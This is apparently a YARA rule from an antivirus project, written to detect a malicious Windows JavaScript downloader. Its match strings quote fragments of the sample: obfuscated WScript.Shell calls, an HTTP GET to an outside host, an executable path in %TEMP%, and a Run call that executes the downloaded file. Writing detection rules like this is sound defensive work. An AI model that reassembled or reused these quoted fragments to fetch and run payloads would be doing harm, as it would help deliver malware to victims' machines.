rule sig_20160328_3750565d21e5f657605f073e598ebb8b {
  meta:
    description = "datamaliciousorder - file 20160328_3750565d21e5f657605f073e598ebb8b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7784854eea10e4d1853817b28a5736ac3fcf4edffc419d2906732380e650c99c"

  strings:
    $s1  = "function Uflidjdtq() {return Jequypc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"6s1Duy1bHcuNE2.exe\";};" fullword ascii
    $s2  = "do {WScript[Owpdqsy](Mplsd() * 11)} while (Ffwul[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Vnhehdrs(Wvvjelx, Sbbamcmm){return Wvvjelx - Sbbamcmm;};" fullword ascii
    $s4  = "var Jequypc = function Srfcxim() {return WScript[Vdslyzoldk](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Ffwul[Lyriixp](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s6  = "function Mplsd(){return 22;};" fullword ascii
    $s7  = "var Ivscr = false;" fullword ascii
    $s8  = "var Mmibvzy = false;" fullword ascii
    $s9  = "function Qwplpui(){return Vdslyzoldk;};" fullword ascii
    $s10 = "function Pktrpbfqjf(){return Uwmjvg;};" fullword ascii
    $s11 = "var Yjdguslo = new this[\"Date\"]();" fullword ascii
    $s12 = "function Bclaxoptu(Lohemnkes) {var Hxrtsu = (1, 2, 3, 4, 5, Lohemnkes); return Hxrtsu;};" fullword ascii
    $s13 = "function Apvlpj()" fullword ascii
    $s14 = "return Vnhehdrs(Jsvgwv, Nyxklai);" fullword ascii
    $s15 = "Mmibvzy = true; " fullword ascii
    $s16 = " while (Bpwwlgco){" fullword ascii
    $s17 = "function Udafjxzw() {return ((Mmibvzy == true) && (Mmibvzy == Rcaowcaxm)) ? 1 : Nrxrwp;};" fullword ascii
    $s18 = "function Cazami(Bgcaytmr){Jequypc[\"Run\"](Bgcaytmr, Nrxrwp, Nrxrwp);};" fullword ascii
    $s19 = "Rcaowcaxm = true; " fullword ascii
    $s20 = "var Rcaowcaxm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}